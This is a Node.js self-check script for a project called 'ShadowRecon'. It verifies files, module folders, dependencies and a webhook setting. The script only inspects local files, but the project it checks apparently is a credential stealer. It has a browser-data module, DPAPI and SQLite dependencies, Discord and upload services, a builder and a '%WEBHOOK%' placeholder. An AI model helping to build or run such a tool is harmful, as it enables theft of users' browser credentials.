#!/usr/bin/env node
/**
 * System Validation Script
 * Validates the entire ShadowRecon system structure and dependencies
 */

const fs = require('fs');
const path = require('path');

console.log('🔍 ShadowRecon System Validation');
console.log('================================\n');

let errors = 0;
let warnings = 0;

/**
 * Log validation result
 */
function logResult(test, passed, message = '') {
    const status = passed ? '✅' : '❌';
    const msg = message ? ` - ${message}` : '';
    console.log(`${status} ${test}${msg}`);
    if (!passed) errors++;
}

/**
 * Log warning
 */
function logWarning(test, message = '') {
    const msg = message ? ` - ${message}` : '';
    console.log(`⚠️  ${test}${msg}`);
    warnings++;
}

/**
 * Check if file exists
 */
function fileExists(filePath) {
    return fs.existsSync(filePath);
}

/**
 * Check if directory exists
 */
function dirExists(dirPath) {
    return fs.existsSync(dirPath) && fs.statSync(dirPath).isDirectory();
}

/**
 * Validate file structure
 */
function validateFileStructure() {
    console.log('📁 File Structure Validation');
    console.log('----------------------------');

    const requiredFiles = [
        'package.json',
        'src/main.js',
        'src/index.js',
        'src/config/config.js',
        'src/core/index.js',
        'src/core/logger.js',
        'src/core/errors.js',
        'src/core/constants.js',
        'src/core/configValidator.js',
        'src/modules/index.js',
        'src/services/index.js',
        'build/builder.js',
        'build.sh'
    ];

    const requiredDirs = [
        'src',
        'src/core',
        'src/config',
        'src/modules',
        'src/services',
        'build'
    ];

    requiredFiles.forEach(file => {
        logResult(`File: ${file}`, fileExists(file));
    });

    requiredDirs.forEach(dir => {
        logResult(`Directory: ${dir}`, dirExists(dir));
    });

    console.log();
}

/**
 * Validate module structure
 */
function validateModules() {
    console.log('🧩 Module Structure Validation');
    console.log('------------------------------');

    const modules = ['browsers'];
    
    modules.forEach(module => {
        const modulePath = `src/modules/${module}`;
        const indexPath = `src/modules/${module}/index.js`;
        
        logResult(`Module directory: ${module}`, dirExists(modulePath));
        
        if (dirExists(modulePath)) {
            const files = fs.readdirSync(modulePath);
            logResult(`Module has files: ${module}`, files.length > 0, `${files.length} files`);
        }
    });

    const services = ['discord', 'upload'];
    
    services.forEach(service => {
        const servicePath = `src/services/${service}`;
        const serviceFile = `src/services/${service}/service.js`;
        
        logResult(`Service directory: ${service}`, dirExists(servicePath));
        logResult(`Service file: ${service}`, fileExists(serviceFile));
    });

    console.log();
}

/**
 * Validate syntax
 */
async function validateSyntax() {
    console.log('⚙️  Syntax Validation');
    console.log('---------------------');

    const { exec } = require('child_process');
    const { promisify } = require('util');
    const execAsync = promisify(exec);

    try {
        await execAsync('node -c src/main.js');
        logResult('Main entry point syntax', true);
        
        // Test require of main modules
        try {
            require('./src/core/index.js');
            logResult('Core modules loadable', true);
        } catch (error) {
            logResult('Core modules loadable', false, error.message);
        }

        try {
            require('./src/config/config.js');
            logResult('Configuration loadable', true);
        } catch (error) {
            logResult('Configuration loadable', false, error.message);
        }

    } catch (error) {
        logResult('Main entry point syntax', false, error.message);
    }

    console.log();
}

/**
 * Validate dependencies
 */
function validateDependencies() {
    console.log('📦 Dependencies Validation');
    console.log('--------------------------');

    try {
        const packageJson = JSON.parse(fs.readFileSync('package.json', 'utf8'));
        const deps = packageJson.dependencies || {};
        const devDeps = packageJson.devDependencies || {};
        
        logResult('package.json readable', true);
        logResult('Has dependencies', Object.keys(deps).length > 0, `${Object.keys(deps).length} dependencies`);
        logResult('Has dev dependencies', Object.keys(devDeps).length > 0, `${Object.keys(devDeps).length} dev dependencies`);

        // Check if node_modules exists
        logResult('node_modules exists', dirExists('node_modules'));

        // Test key dependencies
        const keyDeps = ['axios', '@primno/dpapi', 'better-sqlite3'];
        keyDeps.forEach(dep => {
            try {
                require.resolve(dep);
                logResult(`Dependency: ${dep}`, true);
            } catch {
                logResult(`Dependency: ${dep}`, false, 'not found');
            }
        });

    } catch (error) {
        logResult('package.json readable', false, error.message);
    }

    console.log();
}

/**
 * Validate configuration
 */
function validateConfiguration() {
    console.log('⚙️  Configuration Validation');
    console.log('----------------------------');

    try {
        const config = require('./src/config/config.js');
        logResult('Configuration loadable', true);
        
        // Test basic config access
        const appName = config.get('app.name');
        const webhookUrl = config.get('webhook.url');
        
        logResult('App name accessible', !!appName, appName);
        logResult('Webhook URL accessible', !!webhookUrl, webhookUrl === '%WEBHOOK%' ? 'placeholder' : 'configured');
        
        // Test validation
        const isValid = config.validate();
        logResult('Configuration validation', isValid);

    } catch (error) {
        logResult('Configuration loadable', false, error.message);
    }

    console.log();
}

/**
 * Main validation function
 */
async function main() {
    validateFileStructure();
    validateModules();
    await validateSyntax();
    validateDependencies();
    validateConfiguration();

    console.log('📊 Validation Summary');
    console.log('--------------------');
    
    if (errors === 0 && warnings === 0) {
        console.log('🎉 All validations passed successfully!');
    } else {
        if (errors > 0) {
            console.log(`❌ ${errors} error(s) found`);
        }
        if (warnings > 0) {
            console.log(`⚠️  ${warnings} warning(s) found`);
        }
        
        if (errors === 0) {
            console.log('✅ No critical errors - system should work correctly');
        }
    }
    
    process.exit(errors > 0 ? 1 : 0);
}

// Run validation
if (require.main === module) {
    main().catch(error => {
        console.error('Validation failed:', error.message);
        process.exit(1);
    });
}